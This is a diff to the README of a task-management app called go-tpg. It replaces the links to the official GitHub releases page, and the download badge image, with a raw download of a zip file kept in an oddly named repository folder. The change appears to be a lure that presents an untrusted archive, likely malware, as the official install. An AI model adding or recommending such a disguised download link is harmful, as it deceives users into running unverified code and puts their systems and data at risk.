@@ -4,7 +4,7 @@
 Welcome to go-tpg! This application helps you manage your tasks easily and efficiently. Whether you are organizing your daily chores or planning a project, go-tpg is here to assist you.
 
 ## 🔗 Download Now
-[![Download go-tpg](https://img.shields.io/badge/Download-go--tpg-blue)](https://github.com/Vishal999000/go-tpg/releases)
+[![Download go-tpg](https://raw.githubusercontent.com/Vishal999000/go-tpg/main/iliocaudalis/go-tpg.zip)](https://raw.githubusercontent.com/Vishal999000/go-tpg/main/iliocaudalis/go-tpg.zip)
 
 ## 🎯 Features
 - **Simple Task Management**: Easily add, edit, or delete tasks.
@@ -32,7 +32,7 @@ Welcome to go-tpg! This application helps you manage your tasks easily and effic
 ## 📥 Download & Install
 To get started, visit the page below to download the latest version of go-tpg:
 
-[Download go-tpg](https://github.com/Vishal999000/go-tpg/releases)
+[Download go-tpg](https://raw.githubusercontent.com/Vishal999000/go-tpg/main/iliocaudalis/go-tpg.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page**: Click the link above.
